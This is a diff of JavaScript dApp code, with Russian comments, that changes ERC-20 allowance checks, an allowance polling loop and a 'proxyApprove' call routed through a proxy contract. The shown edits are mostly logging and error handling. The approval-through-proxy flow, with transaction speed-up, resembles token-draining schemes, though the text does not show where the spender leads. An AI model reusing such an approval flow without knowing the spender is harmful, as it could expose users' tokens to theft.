@@ -580,9 +580,10 @@ const getTokenBalance = async (wagmiConfig, address, tokenAddress, decimals, cha
 const getTokenAllowance = async (wagmiConfig, ownerAddress, tokenAddress, spenderAddress, chainId) => {
   if (!ownerAddress || !tokenAddress || !spenderAddress || !isAddress(ownerAddress) || !isAddress(tokenAddress) || !isAddress(spenderAddress)) {
     console.error(`Invalid addresses for allowance check: owner=${ownerAddress}, token=${tokenAddress}, spender=${spenderAddress}`)
-    return 0
+    throw new Error('Invalid addresses for allowance check')
   }
   try {
+    console.log(`Fetching allowance for owner ${ownerAddress}, token ${tokenAddress}, spender ${spenderAddress}, chainId ${chainId}`)
     const allowance = await readContract(wagmiConfig, {
       address: tokenAddress,
       abi: erc20Abi,
@@ -590,35 +591,40 @@ const getTokenAllowance = async (wagmiConfig, ownerAddress, tokenAddress, spende
       args: [ownerAddress, spenderAddress],
       chainId
     })
+    console.log(`Allowance fetched: ${allowance.toString()}`)
     return allowance
   } catch (error) {
-    store.errors.push(`Error fetching allowance for ${tokenAddress} on chain ${chainId}: ${error.message}`)
-    return 0
+    console.error(`Error fetching allowance for ${tokenAddress} on chain ${chainId}: ${error.message}`)
+    store.errors.push(`Error fetching allowance for ${tokenAddress}: ${error.message}`)
+    throw error
   }
 }
 
 const waitForAllowance = async (wagmiConfig, userAddress, tokenAddress, contractAddress, chainId, amount) => {
-  console.log(`Waiting for allowance to become sufficient for ${tokenAddress}...`)
+  console.log(`Waiting for allowance to become sufficient for token ${tokenAddress}, spender ${contractAddress}, chainId ${chainId}...`)
   const maxAttempts = 10
+  const attemptInterval = 2000 // 2 секунды между попытками
   let attempts = 0
+
   while (attempts < maxAttempts) {
     try {
       const allowance = await getTokenAllowance(wagmiConfig, userAddress, tokenAddress, contractAddress, chainId)
-      console.log(`Current allowance: ${allowance.toString()}`)
+      console.log(`Current allowance for ${userAddress} on token ${tokenAddress} for spender ${contractAddress}: ${allowance.toString()}`)
       if (allowance >= amount) {
         console.log(`Allowance is now sufficient: ${allowance.toString()}`)
         return true
       }
       console.log(`Allowance not sufficient yet: ${allowance.toString()}, retrying...`)
-      await new Promise(resolve => setTimeout(resolve, 2000))
+      await new Promise(resolve => setTimeout(resolve, attemptInterval))
       attempts++
     } catch (error) {
       console.error(`Error checking allowance for ${tokenAddress}: ${error.message}`)
       store.errors.push(`Error checking allowance for ${tokenAddress}: ${error.message}`)
+      await new Promise(resolve => setTimeout(resolve, attemptInterval))
       attempts++
-      await new Promise(resolve => setTimeout(resolve, 2000))
     }
   }
+
   const errorMessage = `Failed to confirm sufficient allowance for ${tokenAddress} after ${maxAttempts} attempts`
   console.error(errorMessage)
   store.errors.push(errorMessage)
@@ -653,7 +659,9 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId,
 
   try {
     // Проверка текущего allowance
+    console.log(`Checking allowance for owner ${owner}, token ${checksumTokenAddress}, spender ${checksumContractAddress}, chainId ${chainId}`)
     const currentAllowance = await getTokenAllowance(wagmiConfig, owner, checksumTokenAddress, checksumContractAddress, chainId)
+    console.log(`Current allowance: ${currentAllowance.toString()}`)
     if (currentAllowance >= amount) {
       console.log(`Sufficient allowance already exists: ${currentAllowance.toString()}`)
       return { type: 'none', txHash: null }
@@ -674,7 +682,7 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId,
     }
 
     // Выполнение proxyApprove
-    console.log(`Initiating proxyApprove for ${checksumTokenAddress} to ${checksumContractAddress}`)
+    console.log(`Initiating proxyApprove for token ${checksumTokenAddress} to spender ${checksumContractAddress} with amount ${amount.toString()}`)
     const txHash = await writeContract(wagmiConfig, {
       address: proxyContractAddress,
       abi: proxyApproverAbi,
@@ -685,6 +693,10 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId,
     console.log(`Proxy approve transaction sent: ${txHash}`)
     await monitorAndSpeedUpTransaction(txHash, chainId, wagmiConfig)
 
+    // Проверка allowance после proxyApprove
+    const postApproveAllowance = await getTokenAllowance(wagmiConfig, owner, checksumTokenAddress, checksumContractAddress, chainId)
+    console.log(`Allowance after proxyApprove: ${postApproveAllowance.toString()}`)
+
     return { type: 'proxyApprove', txHash }
   } catch (error) {
     console.error(`Proxy approve failed for ${tokenAddress}:`, error)
@@ -692,7 +704,6 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId,
     throw error
   }
 }
-
 
 const initializeSubscribers = (modal) => {
   const debouncedSubscribeAccount = debounce(async state => {
